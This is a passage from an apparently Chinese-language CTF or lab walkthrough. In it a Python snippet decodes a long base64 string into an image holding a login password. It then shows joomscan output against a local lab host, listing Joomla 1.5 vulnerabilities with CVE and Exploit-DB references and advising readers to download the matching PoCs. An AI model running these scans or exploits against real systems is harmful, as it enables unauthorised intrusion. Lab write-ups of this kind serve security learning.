class="string">KfFEueSSSxL8etIujLmSYJk0QVrHwWISSQqJLxibMsqNzjGLDMfBjWvmzdh6QNJchFS6xWVI0qLn</span></span><br><span class="line"><span class="string">miiu0Nvbm3iWJK0FmdSXsXTpUm++SyboOFj86Ec/SvwtJhGCkPiCsSmj3Ogcs8h8HNy4Zn6MrQcc</span></span><br><span class="line"><span class="string">PXo08UClHo03aZJW0/FAwcpRplCF4qTVJJMWA036gWnTpqUnkx/oOFgcPnw48QcmUflesUiaM9LQ</span></span><br><span class="line"><span class="string">0JD4A/kxxzJ/19y4Zn6MrQckVRM9qEBTX1+f+ANTpOPhJJhCyo2iKN7w/PPPT/qnipINnHfeeYk/</span></span><br><span class="line"><span class="string">sGvXLg/OP48++mjiDySVc8qiyo2iKA7zjW98I8FPb731Vs8kUZTJ8a1vfSvxByaR5jYJHnvsscSV</span></span><br><span class="line"><span class="string">sS699FI13oyLKjeKojjMjh07JtJvvvOd72zevNljeRQlLW6++eZzzz03wQd++tOf/vGPf/RGmPPP</span></span><br><span class="line"><span class="string">Pz/xB5599llvJMktVLlRFMV5vvrVr1511VXhcNj8n9ddd90tt9zil0iKkgp333134uo1t9xyyzXX</span></span><br><span class="line"><span class="string">XOOZPLt27Vq8ePGuXbsm+kBdXV1TU9PatWs9EyknKPRbAEVJRHFx8ZVXXrl+/fpt27Y9/PDDjY2N</span></span><br><span class="line"><span class="string">fkuUM1RVVV155ZXr1q3btm3bL3/5y46Ojklc5GMf+9gFF1zw4osvPvnkk0eOHEnrd++///7777//</span></span><br><span class="line"><span class="string">kksuqa2ttWrGT0KAzLHGYe3atW1tbRle6o033pjEOChZjj1DSktLN27cOPYDDQ0Njz766ObNm0dG</span></span><br><span class="line"><span class="string">Rh599NFoNOqxhPX19Wecccbq1avPOuusNWvWLFmyZMOGDeYH5s2b9/LLL+/YsWP79u3btm177bXX</span></span><br><span class="line"><span class="string">tmzZ4rGQim8kTqiLTZk03Rwah7EVpSfRKnkibr755sTf4ic/+Um618yesb3ttttG/eLtt9+e1ne5</span></span><br><span class="line"><span class="string">4oorMh+QSePeOGRO6uOQ9FJJ54Mb18yPdcwpks6Qq6++2m8Zx2HJkiXHjh1LILb2Z5hC6KJgkSvj</span></span><br><span class="line"><span class="string">MNGi41QHnDxWbu66665xfzf1JjgTlUb9y1/+kuIVMsTVccicFMch6XVUufGXpDPkyiuv9FvGRCQu</span></span><br><span class="line"><span class="string">8dfb2+u3gIon6KJgkRPjsGrVqgTXd6RuVb4qN2vWrEnw66k0lEhcxPbaa69NY0Qmi9vjkDmpjEPS</span></span><br><span class="line"><span class="string">i6hy4yNJZ8jOnTv9ljEJGzZsSPwV/vSnP/kto29oQLGSjSTOJXavWV0e8PWvfz3BT7/zne8kvULi</span></span><br><span class="line"><span class="string">JtXf/OY305bJDxKPQ+bkyjgoE5F0hvzrv/6rN5JMmieffDJxJNlFF100ZetNq3KjZCNnnnlmgp8u</span></span><br><span class="line"><span class="string">Xbp01qxZngmTWyQu6rVmzZrCwiRpBCtWrEjw01mzZuXEcul2cbNcGQdlIpLOkG3btnkjSSbs2LEj</span></span><br><span class="line"><span class="string">8QembJU/VW7SIGlLOe055xRJC58vXLjQG0lyjqTl+ZN+IGn1/Zwozz8qC90NcmIclIlI+iI0Nzc7</span></span><br><span class="line"><span class="string">da/PfOYze/bsicVinZ2djzzyyIwZM5y6clIhk37NfEWVmzTYu3dvgp82Nzcn7QOipMK6deuSfmbZ</span></span><br><span class="line"><span class="string">smUeSKLkLtrkQckSXnvttR/84AennnoqUFNTc+mll7a3t09Zg4pnqHKTBl/60pcS/PSf//mfvRIk</span></span><br><span class="line"><span class="string">z7njjjuSfubb3/62B5IouYvbMTeKkgovvPDCuM3Dn3vuOXVruooqN2lQX19/3XXXjfujTZs23Xff</span></span><br><span class="line"><span class="string">fR7Lk5dcf/3169evT/qxRYsWpZ7YrExBXnnllVSipxXFPS655JIEbRx+85vfeCnMVEOVm/S47777</span></span><br><span class="line"><span class="string">LrvsslHu/Hvuuee9732vXyLlE7fffnvqKsv111//4IMPBoM6h5XxueWWW7Tbg+IjH/vYxxL8dPXq</span></span><br><span class="line"><span class="string">1UmDC5VJo+0X0uahhx566KGHPvCBD1RWVpaWlj766KMtLS1+C5XDXHHFFZWVlatXr7788svHjX17</span></span><br><span class="line"><span class="string">+OGH9+/fP2/evI0bN476wOWXX3755ZdbHzhw4MDDDz/c09PjleBKDvCd73zn+9///uWXX758+fKR</span></span><br><span class="line"><span class="string">kZHEH66trR07xxRl0iTt17148eKGhgZPZJlyqHIzSfxqlJNPXH311T/72c8SfOChhx76yEc+Yndy</span></span><br><span class="line"><span class="string">+cQnPvHNb37zn/7pn0Z9zG4H87Of/exb3/pW4tAoZaoxMjJy//33p/jhieaYokyCxYsXJ/7AnDlz</span></span><br><span class="line"><span class="string">vJFkCqImfcUfvvKVryTWbH74wx9edtllo3rUffnLX54o7MnitttuU0+2kglJ55iipMLatWuTVotO</span></span><br><span class="line"><span class="string">7LdSMkGVG8UH1q5dm7iP4969ez/72c+O+6P77rvvz3/+c4Lf/fCHP3zFFVdkJJ8ytUk6xxQlKb/4</span></span><br><span class="line"><span class="string">xS+Sfubiiy9es2aN+7JMRVS5UXwgqdn/85//fIKf3nrrrYl/XRPFlQxJOscUJQFPPPGEVdgmKVu3</span></span><br><span class="line"><span class="string">bk3xk0paqHKj+EDSAlZ79uxJ8NNdu3Z1dXUl+EBtbW3SUD5FSUDSOaYoYykvL/+Hf/iHpqamDRs2</span></span><br><span class="line"><span class="string">pP5be/bs+d73vqeFSZ1FlRvFB5K6opPuK4cOHXJOHEUZB1VulBS58sort27d2tnZ2d/f//jjj8+b</span></span><br><span class="line"><span class="string">N2/UBx5++OF3vOMd1dXVJ5544nXXXTe2N8iNN964b9++WCx29OjRBx54oLy83CvZ8xZVbpScJHGn</span></span><br><span class="line"><span class="string">i7a2Nm2FoSiKB2zduvWBBx5Ys2bNRGe2888//0Mf+tCWLVt6enqOHDly3333FRUV7dq1a9wP19bW</span></span><br><span class="line"><span class="string">Xnnllf39/Qmq/ympoMqNkpMkzve+6667PJNEUZQpy0svvZQ4Ivi9733vuG3OzjjjjMQ9L1944QWN</span></span><br><span class="line"><span class="string">xckEVW6UnGTv3r1f/OIXx/3R5s2bte6+oihuc9FFFyXu8vvYY49t2rRpop++733vS3z9Bx98cJKS</span></span><br><span class="line"><span class="string">KarcKLnLv/zLv9xwww2j/udDDz10zjnn+CKPoihTiptuuinxB37+858n+OmWLVsSG29WrVqlxptJ</span></span><br><span class="line"><span class="string">o8qNksPcc889JSUln/zkJ7///e9/8pOfPOWUUy677DK/hVIUZUpw8sknJ/7AkSNHEn/grbfeyvAW</span></span><br><span class="line"><span class="string">ykRo+wUltxkZGUl8PFIURVGmGmq5URRFURQlr1DlRlEURVGUvEKVG0VRFEVR8gpVbhRFURRFySum</span></span><br><span class="line"><span class="string">kHLT19eX+AOVlZXeSKJMWZLOMZ2EFknHobe3120ZkjYJ8UCGsWS+jmXD2CqK20wh5Wbbtm2JP6Ct</span></span><br><span class="line"><span class="string">5xW3STzHamtrZ82a5ZkwWUvScejr69u/f7+rMixdujSxcuOBDOOS4TqWDWOrKB4whZSbO+64I/EH</span></span><br><span class="line"><span class="string">br31Vm8kUaYsiefYF77wBc8kyWaSjsO//du/uS3DnXfe6bsM45LhOpYNY6soHjCFlJu//vWvDz30</span></span><br><span class="line"><span class="string">UIIPrF279tprr/VMHmUKkmCOnXvuuTfeeKPH8mQhScdh9+7dX/3qV12V4dprr924caO/MkxEJutY</span></span><br><span class="line"><span class="string">NoytonjDFFJugMsuu+yee+5J8IF777335ptv9kweZQoy7hy79NJLX3jhBV/kySqSjsOmTZtOP/10</span></span><br><span class="line"><span class="string">V2X42te+du+99/orQ2Imt45lw9gqimdMuQrFN9xww/e+972PfvSjCxYsWLRo0fr160d94K677rrh</span></span><br><span class="line"><span class="string">hht+/etf79u3r76+/tlnn/VFTiWPMedYeXn5xz/+8akc77V69eqlS5fOmDFjonHYsWPH/v37e3p6</span></span><br><span class="line"><span class="string">fvrTn27ZssUNGZYtW7Zq1aply5Zdc801tbW1Yz+wf//+HTt2uCpDWqS1jiWYYx6MraIoPjBnzpwn</span></span><br><span class="line"><span class="string">nngiNjGdnZ2XXHKJ32I6SYIva5E0SeTQoUOJr7Bq1Sq3Zcicm2++ObEMP/nJT9K9ZtLvlTkejG3m</span></span><br><span class="line"><span class="string">zzdFVq1a9dZbbyW40b59+0477TRH7jURVVVVW7duTSBDKBS64IILJnfxpM9i5cqVjnyLpOvY/9/e</span></span><br><span class="line"><span class="string">/cdUVf8PHL/7hMQcsTtTBAIlfolsyJShIt1MGZopc6ZzNd1qyx9h0820NStqc42mpjN/Ui1Ls2W5</span></span><br><span class="line"><span class="string">1GERaohC+QMNDCo0EBTIS0JBg8WdUHz/oC8acN/ncO6973PvOc/Hn9z3fZ/XeZ9z3vfFOe/zfuvS</span></span><br><span class="line"><span class="string">tl5OsYkkXCnFxcXiGjIzM8U1HDhwQFzD6tWrh9YuRmGux1ID3b59e9asWYJ7vFar9dixYxs2bJAZ</span></span><br><span class="line"><span class="string">FWB4mZmZZWVlMTExzgqUlJSMGzfu559/9lwMkZGRf/75p+C2WUtLy7Bhwzx3+3bmzJluqUexH+tH</span></span><br><span class="line"><span class="string">QtsC+jJ7ctNr1apV5eXlggI5OTnJycnS4gGMbeTIkXl5eYIC3d3djz76qKfDUFyTefz48R4NYPv2</span></span><br><span class="line"><span class="string">7W6sTbEf6yWnbQF9kdz8S3Ec8c6dO+VEAhjejh07xAVeeeUVT8ewbds2Pz/RoMMtW7a0tLR4Ooyq</span></span><br><span class="line"><span class="string">qio31qbmfQgJbQvojuTmX4WFheICqampzB4LuIXiAOozZ854OgbF0QyHDx/2dAwWiyU+Pr61tTUj</span></span><br><span class="line"><span class="string">I8MttSn2YxYpbQvojuTmrsbGRnGBhx9+WE4kgLFFRkaKC9TV1Xk6BsXJoJubmz0dQy+r1do7HLi6</span></span><br><span class="line"><span class="string">uvrkyZMuvsHQ3d0tLuBwOFypH/AJJDd3KT6ujoqKkhMJYGDx8fHi50FNTU0Sngd5oZiYmIyMjGPH</span></span><br><span class="line"><span class="string">jl2/fl1bDYpta6EfgzmQ3Ny1ZcsWcYF169bJiQQwsBdffFFcQHFEjuFFRUXZ7XYNX1RsWwv9GMyB</span></span><br><span class="line"><span class="string">5OaukpKSTz75RFDAZrO98MIL0uIBjMdmsy1fvlxQoLKy8q233pIWj9cKCQnZvHnzkL6i2LZ9xejH</span></span><br><span class="line"><span class="string">YHgkN/+xdOnS999/X1Bg165d/N8DaJOZmVlcXCwoUFRUNGHCBGnxeLmsrCz1hRXb9l70YzA80y2/</span></span><br><span class="line"><span class="string">oGjFihW7d+/OysoKDg6OjIwcOMXk22+/vWzZstzc3MbGxhs3bnz//fe6xAlfV1NTU11dHRIS4q4J</span></span><br><span class="line"><span class="string">f71TQkJCREREUFDQ6tWrbTbbwAK97fDXX3/t3btXzcs+5hEYGBgeHi540UFl2w56jtGPAaY2ZsyY</span></span><br><span class="line"><span class="string">M2fOCCa3bmhomD17tt5hDoF4ru4ell/4f55bfqGiouLeOSEVz7F7+dDyC0lJSRUVFerbQbLW1lbx</span></span><br><span class="line"><span class="string">biq+0qVI8VgocjY6eKhta7x+zHWKjc/yCz6Nx1IK6uvrH3vsMcEMfuHh4QUFBdnZ2TKjgu/qffJy</span></span><br><span class="line"><span class="string">7z/KiueYL1qwYMGVK1cEaycNbAf0U1RUNOh73Rraln4MZkNyo8qaNWsuXbokKLBx48bU1FRp8cBH</span></span><br><span class="line"><span class="string">dXR0OFtOSPEc8yHh4eFHjhwRFBC0A/oMOt2wK21LPwbzILlRS3H83bvvvisnEviuNWvWCD41zBjP</span></span><br><span class="line"><span class="string">Xbt2iQuI2wEWi2XZsmWD3tZysW3px2ASJDdqlZSUdHR0CAokJiaGh4dLiwe+qKSkRPyp+BzzFWlp</span></span><br><span class="line"><span class="string">aeIC4nYwufLy8smTJ3/wwQeDfupi29KPwSRIboZAcdbUUaNGyYkEPkrxFDLGzLyKKxsYYzfdqKio</span></span><br><span class="line"><span class="string">aN68eY888shDDz00adIkwcMj19uWfgxmwKvgAKCnp5566rPPPtM7CsBQSG4AQDdPPvnk0aNH9Y4C</span></span><br><span class="line"><span class="string">MBoeSwGAPgoLC8lsAE8guQEAfWzatEnvEABjMuljqbCwsIiICLvdXl9fr3csAEyqsrJS7xAAYzLd</span></span><br><span class="line"><span class="string">nZu4uLjS0tJff/31woULN2/eLC0tTUpK0jsoAGbkcDj0DgHa2e12cYGQkBBxgdDQUBdrUCxgWuZK</span></span><br><span class="line"><span class="string">bmbMmHHt2rWUlJS+v6SkpFy5cmXOnDk6RgUA8DmnT58WF5g/f77g08jIyJiYGHENir9NGRkZ4gKm</span></span><br><span class="line"><span class="string">ZaLkZuTIkc7Oxfz8fNcXyQMAmMdrr70mLrBy5crAwEBnn+7YsUNxEwsWLBAkQDk5OYo1mJaJkps9</span></span><br><span class="line"><span class="string">e/YIPtWwBDQAwMwmT54sLuBsadjVq1crrvjdy9mMjvPnz9+wYYOaGszJRMmNzWYTfDpjxgxpkQAA</span></span><br><span class="line"><span class="string">DODSpUtjx469ePGiswJxcXF2u33KlCl9fwkODj506JCa2za9rFZrT0/P7Nmz+/4yfPjw7du3Hzt2</span></span><br><span class="line"><span class="string">THPYZmCit6XEA6/8/PysVmtbW5u0eADoKCAgQFyA0b5Qo76+furUqWFhYbGxsUFBQVlZWf0GyoSE</span></span><br><span class="line"><span class="string">hFy4cKGpqamqqspqtU6cOFHDVgoKCjo6OsrLywMCAu4dNgpnTJTcAECv8PBwcXLT0dHR1NQkLR74</span></span><br><span class="line"><span class="string">ulu3bt26dctisRw/fjw1NfXcuXP9CoSEhLj4ZlNgYKD4+QPuZaLHUgDQa8WKFeICH374oZxIYDzn</span></span><br><span class="line"><span class="string">z58fO3as3lGYHckNAHMZM2ZMdna2oMAff/yxZs0aafHAeOrr69evX693FKZGcgPARBITE2/evCko</span></span><br><span class="line"><span class="string">UFtb++CDD0qLB0b1zjvv6B2CqZHcADC4oKCghISEuXPn5ufnV1RUDCzgcDgqKyuPHz8+b9686Oho</span></span><br><span class="line"><span class="string">+RHCeLq7u69evap3FObFgGIAhhUWFvb555+npaU5K9DW1rZo0aLCwkKZUcEk6urq4uPj9Y3BtOPi</span></span><br><span class="line"><span class="string">SW4AGFNKSkppaamgQE1NTWxsrLR4YDZff/217mv7nDp1St8A9MJjKQAGFBgYKM5sLBYLmQ08aufO</span></span><br><span class="line"><span class="string">nfrOlrR3717TTt5GcgPAgHJzc8UFeJkFEkybNk2vTV+6dGnVqlV6bV13JDcADCg9PV1c4KuvvpIT</span></span><br><span class="line"><span class="string">CcysvLw8Ojr6/Pnzkre7adMmxXWvjI0xNwAMSHE2WNMOtEQvh8MhnqVacYEOlWpra6dNmxYVFTV+</span></span><br><span class="line"><span class="string">/Hh31SnQ1tbGAHkLyQ0AwISqq6sTExMFBWJjY92YAdfW1tbW1rqrNijisRQAwHT2798vLrBy5Uo5</span></span><br><span class="line"><span class="string">kcATSG4AAKazdetW8a2UJUuWaFvBG96A5AYAYEbR0dG//PKLoEBZWVlycrK0eOBGJDcAAJMaN27c</span></span><br><span class="line"><span class="string">okWLioqKampquru7Bxa4fPnyl19+OXv27KioqP/9j19Mn8GhAgCY1xdffDFz5szY2Nhhw4Y9/vjj</span></span><br><span class="line"><span class="string">LS0t/QrMnTu3oKDg+vXrf//995kzZ8aMGaNLnBgSkhsAACwWi+XEiROjRo2qrKx0VmD69Ok3b960</span></span><br><span class="line"><span class="string">2Wwyo4IGJDcAANw1YcIE8aoFxcXFkZGRssKBFiQ3AAD8x7PPPisu8NFHH8mIA1qR3AAA8B8nTpwQ</span></span><br><span class="line"><span class="string">F5g+fbqfH7Pgei8TJTeDjoS/l+KZqlhAcRPegHYwNgnH13Xe8KvgDTFowPUrh8PhUJyemCdT3sxE</span></span><br><span class="line"><span class="string">yU1NTY24QGxsrOBTPz+/8PBwcQ3V1dVDDks62sHYJBxf14ljkMMbYtCA61eaixcviguEhobKiQQa</span></span><br><span class="line"><span class="string">mCi5OXTokLjAM888I/h0wYIF4q+fOnXK4XAMOSzpaAdj8/TxdQtxDHJ4QwwacP1K8/zzz4sLzJkz</span></span><br><span class="line"><span class="string">R04kgILffvutR0hwm1H8xZ6eHqvVKnFXXKJ7O3hDY7700kviGN57772h1un6ftXV1YlrUDMfvEeP</span></span><br><span class="line"><span class="string">r5oY1FTi6Vv6PhGDtvNc9+vXPLKyssTNpXeAcMpEd24sFsvo0aPFj1Hr6uoG9gv+/v6///67uObo</span></span><br><span class="line"><span class="string">6Gjxq4NehXYwNs8dXzcaNAbJvCEGDbh+pdm7d+/rr78uKPDTTz+NGDFCWjyAyNq1a8vKypqbm50l</span></span><br><span class="line"><span class="string">47m5uVOmTBkxYkRCQkJ2drazYp2dnVVVVZs3b9Z7hzTSsR3E/wz1cOfGOfUr+bnr+GqIQX1VfTEE</span></span><br><span class="line"><span class="string">KVG5174Vgyvnuff0Y8OHD9f8XZ+QlpZ2+vRpu93urA1fffXV9PT04OBgxVPIdXo3BnyBv7//kiVL</span></span><br><span class="line"><span class="string">urq6FPugfl5++eXg4GC9w3cb+e2gWDPJjTMalinWfHw1x+CuDd2rq6srPz9f/fnmEzG45TzXsR/b</span></span><br><span class="line"><span class="string">t29fe3t7T09PZ2fngQMHDL/0kr+///z581tbW7WcPe5z8uTJpKQkvRsDvkCQkg9kpLSmH2ntoFg5</span></span><br><span class="line"><span class="string">yY0zGpKbPkM6vq7E4JatOKNy5nufiMG957nMfsxqtQ5abUhIiLt2x5tVVFSob2oPWblypd7N4NUM</span></span><br><span class="line"><span class="string">nmirFBoaqnJqh7Fjx96+fdvT8eiFdjA29cfXmxUXF8fExBDDQDKv3+bm5kH/brfbfXQCoSGZMGHC</span></span><br><span class="line"><span class="string">wPU1JcvNzU1PT9c3Bm9GcvMvxcm2LRbLp59+Wl9f7/lY9EQ7GJua4+v9Dhw4oHcIXhHDQHKu323b</span></span><br><span class="line"><span class="string">tgkymH379rlSua9YunSp3iFYDh48qHcI8HoBAQGKtwHNsBKsnHZQ3ASPpZxx5bGURd3xVaTvY6le</span></span><br><span class="line"><span class="string">I0eONEAMbj/P5Vy/DQ0Ngvo7Ozvdsi/ez43j2DSbMWOG3s3gpbhz8y+Hw6H4DmRDQ4OcYHTkcDgU</span></span><br><span class="line"><span class="string">b7fW1dW5uBXFm+cSnp54IgbX6/R0y6g5vq6TcPgUJ4f1iRjcHqSc61c8sCYgICAwMNDFTfiEGzdu</span></span><br><span class="line"><span class="string">6B2CwrEwM5Ib9KeYwzU2Nrq4CXENHR0dHR0dLm7CxRgsKiZfH0jc2anZL8XGd/2XSUKO7voZokjC</span></span><br><span class="line"><span class="string">WerpGDx0npvk+vUG3vDvroTz3EeR3KC/jz/+WPDp8ePHXd/E4cOHNX/qLopbKSwsHGqd4kfgavZr</span></span><br><span class="line"><span class="string">9+7dgk9PnTrl+s+G+Pi6haeP4Hfffad4n9X7Y/BQhCa5fr2B+GqVoLGxsaSkRN8Y4AMUZy/wxclM</span></span><br><span class="line"><span class="string">tRG8U+quG86902MMyi31q7F8+XJnMeTk5GirUzA1vsoarl275qwGdw3RcPGdcDXjfgTH13Uql/b0</span></span><br><span class="line"><span class="string">8hjUfF0bk1y/3kBwtUqQlpamdwPAF5Dc3GvQH+moqCh31R8QEDCwf+zq6pK8tM3GjRsH7uaePXtc</span></span><br><span class="line"><span class="string">qXPgT8tQ9+v69esebXyLivWJBNQkN4MeX7dISUlRuY9eG4OE89wk1683GPRqlcBHV36FDkhu+nnj</span></span><br><span class="line"><span class="string">jTeqqqq6uroaGhree+89T0w/unnz5rq6ut5NbNu2ze31qzFx4sQjR440Nze3t7efPHkyNTXV9Trf</span></span><br><span class="line"><span class="string">fPNNF/dr3bp1FRUVnZ2ddrvdQ+/W9h3fofaq6t/Y6ju+Wjvwu+x2+8GDBzXM9O9VMcg8z01y/XqD</span></span><br><span class="line"><span class="string">vqvV9XNMUXNzc0FBgXv/1YHBkdzAnIKDgwVP6AZy8XV0AIA8JDcwOfH8JSQ3AHwFb0sB+FdERIQB</span></span><br><span class="line"><span class="string">1mcAAJIbAHctXrxY7xAAwFUkNwDuOnr0qN4hAICrjL98q5dISEiw2Wze8J5kd3f3jz/+eOLECb0D</span></span><br><span class="line"><span class="string">gZe6ceMGw8vgIfSEgGxlZWXicZSaa/7222/VvogiS11dXUJCghtbD4bh6cU7YVr0hIAO1q5dK7gG</span></span><br><span class="line"><span class="string">8vLytFUr7SrVYPr06e5tQxgAyQ08QUqXphE9IQzO7dOWl5aWyrxENXB7G8LXkdzA7egJIRkDiv8j</span></span><br><span class="line"><span class="string">NDT09u3bA/8eHR2tYcHC1NRU9dO062Xt2rV6hwDAyOgJIR/JTX+jR4/eunVrU1OTxWLp6Og4fPjw</span></span><br><span class="line"><span class="string">fffdV1tbq6Eqn5ghOyMjQ+8QABgZPSHkI7kZxPr160NDQ++///4HHnhg8eLF//zzj7Z6/P393RsY</span></span><br><span class="line"><span class="string">oF5GRsa5c+daW1urq6s3bNigdzgwL3pCyEdy49SdO3dcrOHq1atuicSjzp49q3cIcL+8vLzeRUCt</span></span><br><span class="line"><span class="string">VmtMTExOTk5rayu/MdAFPSFgNJcvX9Z7nJwCPz/mOjKa4uLiQY91V1eXmq8zoBhuR08Iybhz41lT</span></span><br><span class="line"><span class="string">p07VOwSRWbNmsZaQwTz33HM2m23Qj/z8/Pbs2SM5HsBCTwgYj7+/v+L0gPK1t7enpaXp3TZwv6qq</span></span><br><span class="line"><span class="string">KvFxV6yBOzfwBHpCyMSNOI+7c+fOpEmT0tPTlyxZ4nA49A7H4nA4fvjhh/379+sdCDwiPj5e8Glg</span></span><br><span class="line"><span class="string">YKDVam1ra5MWD9CLnhAAoJHiv6qKy/pw5waAr2PMDQAAMBSSGwAAYCgkNwAAwFBIbgAAgKGQ3AAA</span></span><br><span class="line"><span class="string">AEMhuQEAAIZCcgMAAAyF5AYAABgKyQ0AADAUkhsAAGAoJDeAoTQdSUSlAAABo0lEQVQ2NooLRERE</span></span><br><span class="line"><span class="string">iAuEh4eLCzQ0NAwtJgCQi+QGMJTCwkJxgSeeeELwqc1m8/MTradbUlLS0tKiJTIAAAAN/Pz8FNfO</span></span><br><span class="line"><span class="string">DAgIcPZ1Vs0EAABeJzExUZygOHuulJ+fL/7i008/LXlfAAAALBaLJSgo6PTp04I0paura/bs2X3l</span></span><br><span class="line"><span class="string">U1JSqqurBeWLi4sTEhJ03CMAAADL8OHD4+Li0tPT8/LynKU4VVVVra2tg36al5e3cOHC5OTkESNG</span></span><br><span class="line"><span class="string">6L0rAAAA/xUTEyN+5NTP3Llz9Q4ZAABAKDg4WGVmk5GRoXewAAAAKmRnZytmNt98843eYQIAAKgT</span></span><br><span class="line"><span class="string">EhKimNxkZmbqHSYAAIBq7e3t4uQmJiZG7xgBAABUq6ioECc34hmKAcD7sfwCYC7iITVnz57t7u6W</span></span><br><span class="line"><span class="string">FgwAAIAbCG7bxMfH6x0dAADAEMXFxQ2a2SxcuFDv0AAAADQJCgoqLi7uS2tKS0uTkpL0DgoAAMA1</span></span><br><span class="line"><span class="string">QUFBycnJYWFhegcCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAAAACg0f8BeD+YFbp5dlYAAAAASUVORK5CYII=&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">imgdata=base64.b64decode(strs)</span><br><span class="line">file=open(<span class="string">&#x27;key.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(imgdata)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>python3运行即可得到图片，原图如下：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/key.png"></p>
<p>还可以使用在线工具直接将base64字符串转成图片：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlYmVhdXRpZnkub3JnL2Jhc2U2NC10by1pbWFnZS1jb252ZXJ0ZXI=">Convert Your Base64 to Image<i class="fa fa-external-link-alt"></i></span></p>
<p>登陆密码即在图片中，挑战完成，帅！！！</p>
<h3 id="其它方法"><a href="#其它方法" class="headerlink" title="其它方法"></a>其它方法</h3><ul>
<li>使用joomscan扫描可以发现存在非常多的漏洞，远程代码执行，sql注入等等，下载对应的poc或者脚本运行即可</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># joomscan -u http://192.168.84.143:666/</span></span><br><span class="line">    ____  _____  _____  __  __  ___   ___    __    _  _ </span><br><span class="line">   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )</span><br><span class="line">  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( </span><br><span class="line">  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)</span><br><span class="line">                        (1337.today)</span><br><span class="line">   </span><br><span class="line">    --=[OWASP JoomScan</span><br><span class="line">    +---++---==[Version : 0.0.7</span><br><span class="line">    +---++---==[Update Date : [2018/09/23]</span><br><span class="line">    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo</span><br><span class="line">    --=[Code name : Self Challenge</span><br><span class="line">    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP</span><br><span class="line"></span><br><span class="line">Processing http://192.168.84.143:666/ ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 1.5</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Joomla! 1.5 Beta 2 - <span class="string">&#x27;Search&#x27;</span> Remote Code Execution</span><br><span class="line">EDB : https://www.exploit-db.com/exploits/4212/</span><br><span class="line"></span><br><span class="line">Joomla! 1.5 Beta1/Beta2/RC1 - SQL Injection</span><br><span class="line">CVE : CVE-2007-4781</span><br><span class="line">EDB : https://www.exploit-db.com/exploits/4350/</span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - (Token) Remote Admin Change Password                                                   </span><br><span class="line">CVE : CVE-2008-3681                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/6234/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - Cross-Site Scripting / Information Disclosure                                          </span><br><span class="line">CVE: CVE-2011-4909                                                                                     </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/33061/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - 404 Error Page Cross-Site Scripting                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/33378/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.12 - <span class="built_in">read</span>/<span class="built_in">exec</span> Remote files                                                                </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/11263/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.12 - connect back Exploit                                                                  </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/11262/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! Plugin <span class="string">&#x27;tinybrowser&#x27;</span> 1.5.12 - Arbitrary File Upload / Code Execution (Metasploit)              </span><br><span class="line">CVE : CVE-2011-4908                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/9926/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5 - URL Redirecting                                                                          </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/14722/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - SQL Error Information Disclosure                                                       </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/34955/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! - Spam Mail Relay                                                                              </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/15979/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5/1.6 - JFilterInput Cross-Site Scripting Bypass                                             </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/16091/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! &lt; 1.7.0 - Multiple Cross-Site Scripting Vulnerabilities                                        </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/36176/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5 &lt; 3.4.5 - Object Injection Remote Command Execution                                        </span><br><span class="line">CVE : CVE-2015-8562                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/38977/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.0 &lt; 3.4.5 - Object Injection <span class="string">&#x27;x-forwarded-for&#x27;</span> Header Remote Code Execution                  </span><br><span class="line">CVE : CVE-2015-8562 , CVE-2015-8566                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/39033/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.0 Beta - <span class="string">&#x27;pcltar.php&#x27;</span> Remote File Inclusion                                                </span><br><span class="line">CVE : CVE-2007-2199                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/3781/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! Component xstandard editor 1.5.8 - Local 